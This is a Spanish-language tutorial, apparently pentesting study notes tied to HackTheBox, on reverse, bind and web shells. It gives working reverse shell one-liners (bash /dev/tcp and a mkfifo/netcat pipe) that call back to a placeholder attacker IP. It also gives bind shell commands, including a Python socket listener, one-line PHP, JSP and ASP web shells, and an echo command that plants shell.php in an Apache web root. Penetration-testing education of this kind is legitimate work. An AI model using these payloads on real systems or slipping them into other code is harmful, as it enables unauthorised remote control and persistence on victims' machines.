---
title: Tipos de intérpretes de comandos
published: true
---

Al comprometer un sistema y explotar una vulnerabilidad para ejecutar comandos de forma remota en los objetivos comprometidos, necesitamos un método de comunicación con el sistema; de
forma que no tengamos que "reexplotar" la misma vulnerabilidad cada vez que queramos ejecutar un comando. Por lo tanto, precisamos de una conexión fiable y directa al terminal del
sistema. 

Una manera de conectar a un sistema comprometido es a través de los protocolos de red, como SSH (Linux) o WinRM (Windows). Debido a que estos protocolos requieren credenciales de inicio
de sesión, necesitaríamos ejecutar comandos de antemano para ganar acceso a ellos.

La otra manera de conseguir Ejecución Remota de Código (RCE) es mediante los intérpretes de comandos (_shells_).  
Como ya vimos, hay 3 tipos principales de intérpretes de comandos:  
- _Reverse Shell_ --> Se conecta de vuelta a nuestro sistema y nos da el control a través de una conexión inversa
- _Bind Shell_ -----> Espera a que nos conectemos y nos proporciona el control cuando lo hemos hecho
- _Web Shell_ ------> Se comunica a través de un servidor _web_, acepta nuestros comandos a través de parámetros HTTP, los ejecuta e imprime la salida  
Vamos a adentrarnos en cada uno de estos intérpretes.

### [](#header-1)Intérprete inverso

Es el tipo más común, el más rápido y más sencillo para obtener acceso a un objetivo comprometido. Una vez encontramos una vulnerabilidad que permite ejecución remota de código en el
objetivo, nos ponemos en modo de escucha con `netcat` en un puerto específico. Acto seguido, podemos ejecutar un comando de intérprete inverso que conecte el intérprete remoto del
sistema a nuestra escucha por `netcat`, consiguiendo una conexión inversa sobre el sistema remoto.

#### [](#header-2)Escucha por Netcat

Haremos:  
`nc -lvnp <puerto>`

Parámetros:  
+ -l ------> Modo de escucha, esperando una conexión hacia nosotros
+ -v ------> Modo detallado, para saber cuándo recibimos una conexión
+ -n ------> Desactivar resolución DNS y conectar sólo desde/a IPs, para acelerar la conexión
+ -p 1234 -> Número del puerto que `netcat` escucha y dónde se debe enviar la conexión inversa

#### [](#header-3)IP de conexión

Primero debemos encontrar la IP de nuestro sistema para enviarnos una conexión inversa:  
`ip a`  
En HTB nos suele interesar dónde pone `tun0`, ya que es la red a la que nos hemos conectado mediante nuestra Red Privada Virtual (VPN).  
En un test de penetración real, quizá estemos conectados ya a la misma red o quizá sea un test externo, por lo que deberíamos conectar desde el 'eth0' o similar.

#### [](#header-4)Comando de Intérprete Inverso

El comando a ejecutar depende del SO del objetivo y de a qué aplicaciones y comandos podamos acceder. Los siguientes comandos suelen ser fiables para ganar una conexión inversa:  
`bash -c 'bash -i >& /dev/TCP/<IP>/<puerto> 0>&1'` --> Linux  
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <Puerto> > /tmp/f` --> Linux  
El caso de la powershell (Windows) es demasiado extenso como para que tenga sentido pegarlo aquí, así que páginas como _PayloadsAllTheThings_ nos serán de ayuda para esos casos.

Al recivir la conexión en el modo escucha de `netcat`, podemos escribir comandos y recibir la respuesta en nuestra máquina. Al usar un _Reverse Shell_, es importante tener en cuenta
su fragilidad: en caso de parar el comando del intérprete inverso o perder la conexión por cualquier motivo, deberemos repetir el proceso inicial.

### [](#header-5)Intérprete enlazado

De forma contraria al intérprete inverso, somos nosotros quienes hemos de conectarnos al puerto en escucha del objetivo. Al ejecutar un comando de intérprete enlazado, empezará
la escucha en un puerto del objetivo (con su intérprete enlazado a este). Tendremos que conectarnos a ese puerto mediante `netcat` y ganaremos el control a través de un intérprete
en ese sistema.

#### [](#header-6)Comando de Intérprete Enlazado

De nuevo hay comandos que nos permiten iniciar un intérprete enlazado desde la máquina objetivo (en este caso nos interesa establecer 0.0.0.0 como IP y 1234 como puerto, para poder
conectar desde cualquier lugar). Algunos son:  
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1 -lvp 1234 >/tmp/f` <-- bash
`python -c 'exec("""import socket as s, subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,
a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`  
...

#### [](#header-7)Conexión por Netcat

Al tener un intérprete de comandos esperándonos en el puerto especificado, podemos conectarnos con:  
`nc <IP> <Puerto(1234)>`

Al contrario que en un _Reverse Shell_, si tiramos la conexión por el motivo que sea, podemos reconectarnos de forma inmediata. A no ser, que se detenga el intérprete enlazado o
se reinicie la máquina remota.

#### [](#header-8)Actualizando la TTY

Al conectar a un intérprete con `Netcat`, no podremos mover el cursor ni acceder al histórico de comandos. Para poder hacerlo, debemos actualizar el entorno de entrada y salida
de texto (teletipo). La idea es mapear nuestro TTY con el TTY remoto.  
Hay diversas maneras de hacerlo. Nosotros utilizaremos el método `python/stty` en nuestro intérprete:  
`python -c 'import pty; pty.spawn("/bin/bash")'`  
Después hacemos [CTRL + z] para poner nuestro intérprete en segundo plano y volver a nuestro terminal local, para introducir:  
`stty raw -echo`  
`fg`  
Al hacer esto, nuestro intérprete con `netcat` volverá a primer plano y mostrará una línea en blanco. Podemos apretar [ENTER] para volver a nuestro intérprete o poner `reset` y
apretar [ENTER] para traerla de nuevo. Una vez hecho esto tendremos nuestro intérprete TTY con todas las funciones.

Puede que observemos que nuestro intérprete no cubre la terminal completa. Para arreglarlo debemos abrir otro intérprete en otro escritorio para comprobar los siguientes valores:  
`echo $TERM` Ejemplo de salida: xterm-256color  
`stty size`  Ejemplo de salida: 67 318 (filas y columnas)  
Luego en nuestro intérprete `netcat` hacemos:  
`export TERM=xterm-256color` y  
`stty rows 67 columns 318`  

Finalmente, nos queda un intérprete `netcat` igual a nuestro terminal, como si de SSH se tratara.

### [](#header-9)Intérprete Web

Suele ser un _script_ (por ejemplo en `PHP` o `ASPX`), que nos permite introducir comandos mediante parámetros de peticiones HTTP como `GET` o `POST`, ejecutan nuestro comando
e imprimen la salida.

#### [](#header-10)Escribiendo un Intérprete Web

Primero, necesitamos escribir nuestro intérprete web que admitirá comandos a través de una petición `GET`, los ejecutará e imprirá su salida. Lo más típico es un _script_ de una
línea, corto y fácil de memorizar. Algunos son los siguientes:  
`<?php system($_REQUEST["cmd"]); ?>` --> PHP  
`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` --> JSP  
`<% eval request("cmd") %>` --> ASP  

#### [](#header-11)Subiendo un Intérprete Web

Una vez tenemos nuestro intérprete web, necesitamos colgarlo en el directorio raíz del anfitrión web para ejecutarlo mediante el navegador web. Esto se puede hacer a través de una
vulnerabilidad en una funcionalidad de carga de archivos, que nos permite escribir un intérprete en un archivo (`shell.php` por ejemplo) y subirlo para luego acceder y ejecutar
comandos.

De todas formas, si sólo tenemos RCE por un _exploit_, podemos escribir nuestro intérprete directamente en la raíz web para acceder desde la web. Por lo tanto, el primer paso
es localizar la raíz web. Las siguientes raíces son las más comunes:  
- Apache ---> /var/www/html/
- Nginx ----> /usr/local/nginx/html/
- IIS ------> c:\inetpub\wwwroot\
- XAMPP ----> C:\xampp\htdocs\

Podemos comprovar esos directorios para ver que raíz web está en uso y hacer `echo` para escribir nuestro intérprete. Por ejemplo, para un anfitrión Linux con Apache podríamos
hacer:  
`echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`  

#### [](#header-12)Accediendo al Intérprete Web

Una vez escrito, podemos acceder por el navegador o con `cURL`. Podemos visitar la página `shell.php` en el sitio comprometido y usar `?cmd=id` para ejecutar el comando `id`.  
O también hacer `curl http://<IP>:<Puerto>/shell.php?cmd=id`.  

Esto funciona de igual forma con otros comandos.  
Por un lado, algo muy interesante de un intérprete web, es que nos permite eludir cualquier restricción del cortafuegos que tenga
el sitio, pues no abrirá una conexión nueva, sino que correrá en el puerto web que use la aplicación. Otro punto a favor es que si se reinicia el anfitrión comprometido, el intérprete
seguirá en su sitio, por lo que no tendremos que explotarlo de nuevo.

Por otro lado, al no ser interactivo como los anteriores, deberemos cambiar la URL cada vez que ejecutemos un comando. De cualquier forma, en casos extremos, es posible crear un
_script_ en `Python` que nos automatice el proceso, dándonos un intérprete web semi-interactivo en nuestro terminal.
